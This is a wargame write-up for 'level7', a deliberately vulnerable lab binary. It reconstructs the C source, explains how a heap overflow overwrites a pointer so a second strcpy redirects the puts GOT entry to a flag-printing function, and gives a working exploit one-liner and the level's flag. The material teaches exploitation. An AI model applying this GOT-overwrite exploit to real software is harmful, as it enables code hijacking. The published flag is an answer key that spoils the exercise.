# level7 — heap overflow: overwrite a pointer, then a GOT entry

**Teaches:** combining a heap overflow (to control a `strcpy` destination) with
a GOT overwrite. Re-read primer §5–§6.

## 1. What the binary does
```
./level7           # segfault
./level7 a         # segfault
./level7 a b       # ~~
```

## 2. Reconstructed C
```c
char c[68];                                   // global; the flag is read here
void m(void) { printf("%s - %d\n", c, (int)time(0)); }   // prints c (the flag)

int main(int ac, char **av) {
    int *a = malloc(8); a[0] = 1; a[1] = (int)malloc(8);  // a[1] = ptr
    int *b = malloc(8); b[0] = 2; b[1] = (int)malloc(8);  // b[1] = ptr
    strcpy((char*)a[1], av[1]);               // overflow reaches b[1]
    strcpy((char*)b[1], av[2]);               // dest = whatever b[1] now points to
    fgets(c, 68, fopen("/home/user/level8/.pass", "r"));  // flag loaded into c
    puts("~~");
    return 0;
}
```

## 3. The vulnerability
The first `strcpy` overflows chunk `a[1]` and overwrites the pointer `b[1]`,
which is the **destination** of the second `strcpy`. So the second `strcpy`
writes `av[2]` to *any address we choose*. We point it at the **`puts` GOT
entry** and write the address of `m()`. `m()` prints the global `c`, which holds
level8's pass.

## 4. Step by step
1. `ltrace ./level7 <pattern> b` → shows 4 mallocs and the two `strcpy`s; the
   crash pattern gives offset from `a[1]` to `b[1]` = **20**.
2. Find the `puts` GOT slot:
   ```
   (gdb) disassemble 0x08048400     # puts@plt
   jmp *0x08049928                  # <- GOT entry
   (gdb) info function m            # 0x080484f4
   ```

## 5. Exploit
```
./level7 $(python -c 'print "A"*20 + "\x28\x99\x04\x08"') $(python -c 'print "\xf4\x84\x04\x08"')
```
**Why it works:** argv[1] = 20 padding + the `puts` GOT address → this becomes
`b[1]`. Then `strcpy(b[1], av[2])` writes `m`'s address into the `puts` GOT slot.
When `puts("~~")` runs, it jumps to `m()`, which prints `c` = the flag.

Flag → `5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9`
